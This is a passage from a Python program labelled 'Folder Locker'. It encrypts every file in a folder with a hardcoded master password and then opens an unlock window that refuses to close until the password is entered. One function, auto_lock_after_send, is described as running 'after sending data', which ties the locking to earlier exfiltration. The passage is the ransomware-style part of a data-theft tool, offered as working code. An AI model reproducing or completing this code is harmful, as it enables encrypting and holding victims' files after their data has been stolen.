        if not self.unlocked:
            messagebox.showwarning("Cannot Close", 
                                  "🔒 You must enter the correct password to unlock your files!\n\n"
                                  "Your files will remain encrypted until you enter the password.\n\n"
                                  "Click 'Forgot Password?' if you need help.")
            # Don't destroy - keep window open
            return
        else:
            self.root.destroy()
    
    def run(self):
        """Run the GUI"""
        self.root.mainloop()
        return self.unlocked


def lock_folder(folder_path, password=MASTER_PASSWORD):
    """Lock/encrypt a folder"""
    encryptor = FolderEncryptor(password)
    count = encryptor.encrypt_folder(folder_path)
    return count


def unlock_folder_gui(folder_path):
    """Show unlock GUI for a folder"""
    gui = FolderLockerGUI(folder_path)
    return gui.run()


def is_folder_locked(folder_path):
    """Check if folder is locked"""
    return Path(folder_path).joinpath(LOCK_FILE).exists()


def auto_lock_after_send(folder_path, password=MASTER_PASSWORD):
    """Lock folder and show GUI (called after sending data)"""
    print(f"\n[*] Locking folder: {folder_path}")
    print(f"[*] Password: {password}")
    
    # Lock the folder
    encryptor = FolderEncryptor(password)
    count = encryptor.encrypt_folder(folder_path)
    
    if count > 0:
        print(f"[+] Locked {count} files")
        print("[*] Showing unlock GUI...")
        
        # Show GUI
        gui = FolderLockerGUI(folder_path)
        gui.run()
    else:
        print("[-] No files to lock")


def main():
    """Main function"""
    import argparse
    
    parser = argparse.ArgumentParser(description='Folder Locker')
    parser.add_argument('--lock', '-l', type=str, help='Lock a folder')
    parser.add_argument('--unlock', '-u', type=str, help='Unlock a folder (GUI)')
    parser.add_argument('--password', '-p', type=str, default=MASTER_PASSWORD, help='Password')
    parser.add_argument('--check', '-c', type=str, help='Check if folder is locked')
    parser.add_argument('--demo', type=str, help='Demo: lock folder and show unlock GUI')
    
    args = parser.parse_args()
    
    if args.lock:
        if os.path.exists(args.lock):
            print(f"[*] Locking folder: {args.lock}")
            count = lock_folder(args.lock, args.password)
            print(f"[+] Locked {count} files")
            print(f"[*] Password: {args.password}")
        else:
            print(f"[-] Folder not found: {args.lock}")
    
    elif args.unlock:
        if os.path.exists(args.unlock):
            unlock_folder_gui(args.unlock)
        else:
            print(f"[-] Folder not found: {args.unlock}")
    
    elif args.check:
        if is_folder_locked(args.check):
            print(f"[!] Folder is LOCKED: {args.check}")
        else:
            print(f"[+] Folder is unlocked: {args.check}")
    
    elif args.demo:
        if os.path.exists(args.demo):
            auto_lock_after_send(args.demo, args.password)
        else:
            print(f"[-] Folder not found: {args.demo}")
    
    else:
        # Show file dialog to select folder
        root = tk.Tk()
        root.withdraw()
        
        folder = filedialog.askdirectory(title="Select folder to lock/unlock")
        if folder:
            if is_folder_locked(folder):
                print(f"[*] Folder is locked, showing unlock GUI...")
                root.destroy()
                unlock_folder_gui(folder)
            else:
                if messagebox.askyesno("Lock Folder", f"Lock this folder?\n\n{folder}"):
                    root.destroy()
                    count = lock_folder(folder, MASTER_PASSWORD)
                    print(f"[+] Locked {count} files with password: {MASTER_PASSWORD}")
                    
                    # Show unlock GUI
                    unlock_folder_gui(folder)
                else:
                    root.destroy()


if __name__ == '__main__':
    main()
